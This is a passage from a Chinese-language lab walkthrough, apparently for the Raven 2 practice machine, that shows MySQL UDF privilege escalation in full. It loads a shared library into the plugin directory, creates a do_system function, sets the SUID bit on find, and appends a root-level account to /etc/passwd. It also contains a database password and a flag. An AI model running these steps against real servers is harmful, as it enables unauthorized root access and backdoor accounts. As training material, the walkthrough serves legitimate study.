# 简介

该项目是William McCann作者的第二个项目的，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

该项目有始有终会用到 信息收集 -> 端口信息枚举 -> PHPMailer漏洞利用 -> 内网信息枚举 -> mysql UDF 提权 -> John爆破 -> sudo提权 -> UDF拓展知识点，最终拿到flag.txt的过程，那么在八大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

请注意：

本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 5、漏洞利用

登录MySQL：

```

mysql -uroot -pR@v3nSecurity 
```

![](../Images/f578d2a6d7bbd3bf9402eeaa0b0d321a.png)

进入数据库创建数据表test：

```

create table test(line blob);
```

![](../Images/06697fdfbd53ea6171f9800d89a37538.png)

数据表test创建成功！

插入数据文件：

```
insert into test values(load\_file('/tmp/test.so'));
```

![](../Images/57d03bfcd1d4e661641cb6ebd2d4817f.png)

test 表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出；outfile会有特殊的转换，而dumpfile是原数据导出！

利用dumpfile函数把文件导出至/usr/lib/mysql/plugin目录下，新建存储函数：

```
select \* from test into dumpfile '/usr/lib/mysql/plugin/test.so';
```

![](../Images/2f31e9dc70dff793e0360774e34e4951.png)

创建自定义函数do\_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：

```
create function do\_system returns integer soname 'test.so';
```

![](../Images/d1392ffec98ade7b76af8f11a5ece192.png)

新建存储函数成功！

查看以下创建的函数：

```
select \* from mysql.func;
```

![](../Images/172bdae8b020a3ab950a81e4acaca3df.png)

调用do\_system函数来给find命令所有者的suid权限，使其可以执行root命令：

```
select do\_system('chmod u+s /usr/bin/find');
```

![](../Images/615064a263cdce5b674de31c03f66f7b.png)

执行find命令，使用find执行 shell

```


touch test     #创建test文件
```

![](../Images/ddb261647e8b0e462c9afd1ec368469b.png)

获得flag4{df2bc5e951d91581467bb9a2a8ff4425}

## 2、创建root权限用户

1）先生成root11明文的秘钥

```

openssl passwd root11     
```

![](../Images/693e65c201138781fc971b9ba5733826.png)

2）生成密匙后通过do\_system执行命令，创建一个用户写入passwd内

```
select do\_system('echo "root11:j.beG3DJSb8OU:0:0:root:/root:/bin/bash" >> /etc/passwd');
```

![](../Images/869817a8109d2588b211bc400af50f73.png)

写入成功！

3）查询是否写入成功

```
cat /etc/passwd
```

![](../Images/03df535a0cfaf856026e8f6e5eb4eae6.png)

写入账户成功！

4）那么存在这个用户后就可以进行该用户登录啦

```

```

![](../Images/9e771e0e76fa775ce0c864e87dfb21ca.png)

成功获得root权限用户！
